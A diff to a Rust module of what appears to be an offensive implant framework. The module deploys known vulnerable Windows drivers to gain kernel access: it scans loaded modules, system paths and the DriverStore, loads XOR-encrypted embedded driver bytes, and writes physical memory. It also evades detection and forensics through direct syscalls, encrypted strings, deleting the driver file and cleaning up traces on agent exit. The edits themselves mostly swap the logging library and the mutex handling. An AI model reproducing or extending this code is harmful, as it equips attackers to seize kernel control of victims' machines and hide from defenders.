@@ -9,6 +9,7 @@
 //! All NT API calls go through `syscall!`.
 //! All strings through `string_crypt`.
 
+use common::lock::MutexExt;
 use super::driver_db::{self, DriverMapping, VulnerableDriver};
 use anyhow::{bail, Context, Result};
 use once_cell::sync::Lazy;
@@ -218,7 +219,7 @@ pub fn scan_for_loaded_driver(preferred: &[String]) -> Result<Option<&'static Vu
             for driver_name in &filter {
                 if module_name.eq_ignore_ascii_case(driver_name) {
                     if let Some(driver) = driver_db::find_driver(driver_name) {
-                        log::info!("Found already-loaded vulnerable driver: {}", driver.name);
+                        tracing::info!("Found already-loaded vulnerable driver: {}", driver.name);
                         return Ok(Some(driver));
                     }
                 }
@@ -279,7 +280,7 @@ fn find_driver_in_system_paths(driver: &VulnerableDriver) -> Option<String> {
     ];
     for path in &candidates {
         if Path::new(path).exists() {
-            log::info!("Found {} at {}", driver.name, path);
+            tracing::info!("Found {} at {}", driver.name, path);
             return Some(path.clone());
         }
     }
@@ -293,7 +294,7 @@ fn find_driver_in_system_paths(driver: &VulnerableDriver) -> Option<String> {
         for entry in entries.flatten() {
             let candidate = entry.path().join(driver.name);
             if candidate.exists() {
-                log::info!(
+                tracing::info!(
                     "Found {} in DriverStore at {}",
                     driver.name,
                     candidate.display()
@@ -348,18 +349,18 @@ fn deploy_from_local_path(
     };
 
     {
-        let mut guard = DEPLOYED.lock().unwrap();
+        let mut guard = DEPLOYED.lock_recover();
         *guard = Some(deployed);
     }
 
-    log::info!(
+    tracing::info!(
         "Deployed {} from local path {} (device handle: {:?})",
         driver.name,
         source_path,
         Some(device_handle)
     );
 
-    let guard = DEPLOYED.lock().unwrap();
+    let guard = DEPLOYED.lock_recover();
     Ok(guard.as_ref().unwrap().clone())
 }
 
@@ -422,18 +423,18 @@ pub fn deploy_embedded_driver(
 
     // Store in global state (single construction, no redundant re-build).
     {
-        let mut guard = DEPLOYED.lock().unwrap();
+        let mut guard = DEPLOYED.lock_recover();
         *guard = Some(deployed);
     }
 
-    log::info!(
+    tracing::info!(
         "Deployed vulnerable driver {} (device handle: {:?})",
         driver.name,
         Some(device_handle)
     );
 
     // Read back from global state for the return value.
-    let guard = DEPLOYED.lock().unwrap();
+    let guard = DEPLOYED.lock_recover();
     Ok(guard.as_ref().unwrap().clone())
 }
 
@@ -463,9 +464,21 @@ static EMBEDDED_DRIVER_BYTES: &[u8] = PLACEHOLDER_DRIVER_BYTES;
 #[cfg(all(feature = "embedded_driver", has_sys_driver_path))]
 static EMBEDDED_DRIVER_BYTES: &[u8] = include_bytes!(env!("SYS_DRIVER_PATH"));
 
-#[cfg(all(feature = "embedded_driver", not(has_sys_driver_path)))]
+/// When the `embedded_driver` feature is enabled but no driver path was
+/// provided and the build is running under CI/EMBEDDED_DRIVER_ALLOW_MISSING,
+/// fall back to the placeholder bytes so the code compiles as a no-op stub.
+#[cfg(all(feature = "embedded_driver", not(has_sys_driver_path), embedded_driver_missing))]
+static EMBEDDED_DRIVER_BYTES: &[u8] = PLACEHOLDER_DRIVER_BYTES;
+
+/// When the `embedded_driver` feature is enabled, no driver path was provided,
+/// and this is NOT a CI/allow-missing build, fail at compile time.
+#[cfg(all(
+    feature = "embedded_driver",
+    not(has_sys_driver_path),
+    not(embedded_driver_missing)
+))]
 compile_error!(
-    "embedded_driver requires SYS_DRIVER_PATH or ORCHESTRA_DRIVER_PATH to point to an XOR-encrypted driver file"
+    "embedded_driver requires SYS_DRIVER_PATH or ORCHESTRA_DRIVER_PATH to point to an XOR-encrypted driver file. Set EMBEDDED_DRIVER_ALLOW_MISSING=1 or CI=1 to compile a no-op stub."
 );
 
 #[inline]
@@ -483,7 +496,7 @@ fn get_embedded_driver_bytes(driver: &VulnerableDriver) -> Vec<u8> {
     let is_embedded = embedded.iter().any(|d| std::ptr::eq(*d, driver));
 
     if !is_embedded {
-        log::debug!(
+        tracing::debug!(
             "No embedded resource for {} (not a Tier 1 driver)",
             driver.name
         );
@@ -491,7 +504,7 @@ fn get_embedded_driver_bytes(driver: &VulnerableDriver) -> Vec<u8> {
     }
 
     if !embedded_payload_is_configured() {
-        log::warn!(
+        tracing::warn!(
             "Embedded driver payload is not configured for {}. Build with --features embedded_driver and set SYS_DRIVER_PATH.",
             driver.name
         );
@@ -752,7 +765,7 @@ fn delete_file_from_disk(path: &str) -> Result<()> {
 
     if status != 0 {
         // Non-fatal: the driver is already loaded in kernel memory.
-        log::warn!("Failed to delete driver file from disk: 0x{:08X}", status);
+        tracing::warn!("Failed to delete driver file from disk: 0x{:08X}", status);
     }
 
     Ok(())
@@ -1035,7 +1048,7 @@ pub unsafe fn write_physical_memory(
 /// # Safety
 /// Must be called before agent exit to avoid leaving traces.
 pub unsafe fn cleanup_driver() -> Result<()> {
-    let mut guard = DEPLOYED.lock().unwrap();
+    let mut guard = DEPLOYED.lock_recover();
     if let Some(deployed) = guard.take() {
         // Close device handle.
         if let Some(handle) = deployed.device_handle {
@@ -1055,14 +1068,14 @@ pub unsafe fn cleanup_driver() -> Result<()> {
         // unlinked from PsLoadedModuleList by the overwrite module for full
         // anti-forensic cleanup.
 
-        log::info!("Cleaned up driver deployment for {}", deployed.driver.name);
+        tracing::info!("Cleaned up driver deployment for {}", deployed.driver.name);
     }
     Ok(())
 }
 
 /// Get a reference to the currently deployed driver state, if any.
 pub fn get_deployed_driver() -> Option<DeployedDriver> {
-    let guard = DEPLOYED.lock().unwrap();
+    let guard = DEPLOYED.lock_recover();
     guard.as_ref().map(|d| d.clone())
 }
 
@@ -1092,7 +1105,7 @@ fn is_process_elevated() -> bool {
     });
 
     if status != 0 {
-        log::warn!(
+        tracing::warn!(
             "is_process_elevated: NtOpenProcessToken failed (0x{:08X}) — assuming not elevated",
             status
         );
@@ -1118,7 +1131,7 @@ fn is_process_elevated() -> bool {
     let _ = unsafe { crate::syscall!("NtClose", token_handle as u64) };
 
     if status != 0 {
-        log::warn!(
+        tracing::warn!(
             "is_process_elevated: NtQueryInformationToken failed (0x{:08X}) — assuming not elevated",
             status
         );
@@ -1158,14 +1171,14 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
 
         // Store in global state (single construction, no redundant re-build).
         {
-            let mut guard = DEPLOYED.lock().unwrap();
+            let mut guard = DEPLOYED.lock_recover();
             *guard = Some(deployed);
         }
 
-        log::info!("Using pre-loaded vulnerable driver: {}", driver.name);
+        tracing::info!("Using pre-loaded vulnerable driver: {}", driver.name);
 
         // Read back from global state for the return value.
-        let guard = DEPLOYED.lock().unwrap();
+        let guard = DEPLOYED.lock_recover();
         return Ok(guard.as_ref().unwrap().clone());
     }
 
@@ -1183,7 +1196,7 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
         // system directories and the DriverStore for any known vulnerable
         // driver that is already present on this machine (e.g., installed by
         // a hardware vendor, Windows Update, or previous software install).
-        log::info!(
+        tracing::info!(
             "No embedded driver payload configured; scanning system paths and \
              DriverStore for known vulnerable drivers."
         );
@@ -1200,7 +1213,7 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
             if let Some(sys_path) = find_driver_in_system_paths(driver) {
                 match deploy_from_local_path(driver, &sys_path) {
                     Ok(deployed) => return Ok(deployed),
-                    Err(e) => log::warn!(
+                    Err(e) => tracing::warn!(
                         "DriverStore deploy of {} from {}: {}",
                         driver.name,
                         sys_path,
@@ -1235,7 +1248,7 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
         match deploy_embedded_driver(driver, session_key) {
             Ok(deployed) => return Ok(deployed),
             Err(e) => {
-                log::warn!("Failed to deploy embedded driver {}: {}", driver.name, e);
+                tracing::warn!("Failed to deploy embedded driver {}: {}", driver.name, e);
                 continue;
             }
         }
